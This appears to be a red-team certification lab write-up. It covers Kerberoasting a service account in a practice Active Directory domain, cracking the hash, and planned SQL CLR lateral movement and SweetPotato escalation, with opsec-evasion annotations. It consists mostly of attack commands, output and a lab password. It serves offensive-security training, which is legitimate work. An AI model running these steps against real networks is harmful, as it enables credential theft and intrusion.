# Credential Access Challenge Solution commands  

>Opsec Safe way enumeration of all target accounts with not null SPN value set, not krbtgt account and not disabled accounts.  

## Enumeration  

```sh
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes name,samAccountName,servicePrincipalName
```  

<img src="/images/credential-access-challenge01.png" width=860>  

>Spot honey accounts not real to be noted in exam to skip accounts that can detect our presence in exam.

>Obtain HASH value for only `mssql_svc` target account and not triggering the honeypot accounts, remaining undetected.  

```sh
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
```  

<img src="/images/credential-access-challenge02.png" width=860>

## Crack Hash  

>Hashcat

```bash
# Kerberoast hash — mode 13100 (NOT 18200 which is AS-REP roast)
hashcat -a 0 -m 13100 /media/skippypeanut/2tb-hiksemi/hashcat-cracking/cred-acc-challenge.hash ../wordlists/rockyou.txt
```

> **Common mistake:** `-m 18200` is AS-REP roasting (`$krb5asrep$` prefix). Kerberoasting produces `$krb5tgs$` hashes — use `-m 13100`. Using the wrong mode gives "Separator unmatched / No hashes loaded".

| Mode | Attack | Hash prefix | Rubeus command |
|------|--------|-------------|----------------|
| `13100` | Kerberoasting | `$krb5tgs$23$*` | `kerberoast /user:mssql_svc /nowrap` |
| `18200` | AS-REP Roasting | `$krb5asrep$23$` | `asreproast /format:hashcat /nowrap` |

> **[2026-04-17] Lab result:** `mssql_svc` cracked — `Passw0rd!`

## Credential Access Obtained

```cs
spawnas CONTOSO\mssql_svc Passw0rd! tcp-local
[04/17 18:08:55] [*] Tasked beacon to spawn windows/beacon_bind_tcp (127.0.0.1:1337) as CONTOSO\mssql_svc
[04/17 18:09:00] [+] host called home, sent: 334544 bytes
[04/17 18:09:03] [+] established link to child beacon: 10.10.121.108
```  

## Post Exploitation  

> **Lab environment note:** This challenge lab contains only a domain controller — no SQL servers are provisioned. Steps marked `[EXAM DAY]` are not executable here but are the expected next actions when `mssql_svc` is obtained in a full exam environment where SQL servers exist.

Loaded script `C:\Tools\SQL-BOF\SQL\SQL.cna`

<img src="/images/credential-access-challenge03.png" width=860>

### Step 1 — Situational Awareness on mssql_svc Beacon

```cs
beacon> getuid                        // OPSEC-🟢SAFE — built-in, no child process
beacon> process_browser               // OPSEC-🟢SAFE — built-in GUI tab, no child process

// Check for SeImpersonatePrivilege — present on SQL service accounts
beacon> powerpick whoami /priv        // OPSEC-🟠CAUTION — fork & run (spawns spawnto process)
```

> **SeImpersonatePrivilege present?** SQL service accounts run as a service identity and almost always have `SeImpersonatePrivilege`. This opens the SweetPotato privilege escalation path directly to SYSTEM without needing a separate service registry exploit.

### Step 2 — File System Enumeration

```cs
beacon> file_browser                                         // OPSEC-🟢SAFE — built-in GUI, no child process
beacon> ls C:\Users\mssql_svc\Desktop                        // OPSEC-🟢SAFE — built-in beacon command
beacon> ls C:\Users\mssql_svc\Documents                      // OPSEC-🟢SAFE — built-in beacon command
beacon> ls "C:\Program Files\Microsoft SQL Server"           // OPSEC-🟢SAFE — built-in beacon command
```

### Step 3 — [EXAM DAY] SQL Server Enumeration

```cs
// Enumerate SQL instances via LDAP SPN query
beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
//                                                            // OPSEC-🟢SAFE — BOF, runs in beacon thread

beacon> sql-info lon-db-1                                     // OPSEC-🟢SAFE — SQL BOF, no child process
beacon> sql-whoami lon-db-1                                   // OPSEC-🟢SAFE — SQL BOF, no child process

// If not sysadmin — check linked servers
beacon> sql-links lon-db-1                                    // OPSEC-🟢SAFE — SQL BOF, no child process
```

### Step 4 — [EXAM DAY] SQL CLR Payload for Lateral Movement

```cs
beacon> sql-whoami lon-db-1                                   // OPSEC-🟢SAFE — confirm sysadmin before proceeding

beacon> sql-enableclr lon-db-1                                // OPSEC-🟠CAUTION — modifies SQL server config (sp_configure change, detectable in SQL audit log)
beacon> sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
//                                                            // OPSEC-🟠CAUTION — loads CLR assembly into SQL, visible in sys.assemblies

beacon> link lon-db-1 <SMB-PIPENAME>                          // OPSEC-🟢SAFE — connects to waiting SMB beacon, no new process
```

### Step 5 — [EXAM DAY] Privilege Escalation via SeImpersonatePrivilege

```cs
// SweetPotato — payload must be pre-staged on the SQL host as tcp-local EXE
beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
//                                                            // OPSEC-🟠CAUTION — fork & run (execute-assembly spawns spawnto process)
beacon> connect localhost 1337                                // OPSEC-🟢SAFE — links to SYSTEM beacon over TCP, no new process
```

### Step 6 — [EXAM DAY] Cleanup SQL CLR

```cs
beacon> sql-disableclr lon-db-1                               // OPSEC-🟠CAUTION — reverts sp_configure change, logged in SQL audit
```

### Decision Flow — What to Do After mssql_svc Beacon

```
mssql_svc beacon obtained
│
├─ Check whoami /priv
│   └─ SeImpersonatePrivilege = Yes
│       → SweetPotato → SYSTEM on current host (Step 5)
│
├─ SQL server in scope?
│   └─ Yes → sql-whoami → sysadmin?
│       ├─ Yes → sql-enableclr → sql-clr → beacon on SQL host (Step 4)
│       └─ No  → check sql-links → lateral via linked server
│
└─ File system enumeration → look for flags, creds, config files (Step 2)
```

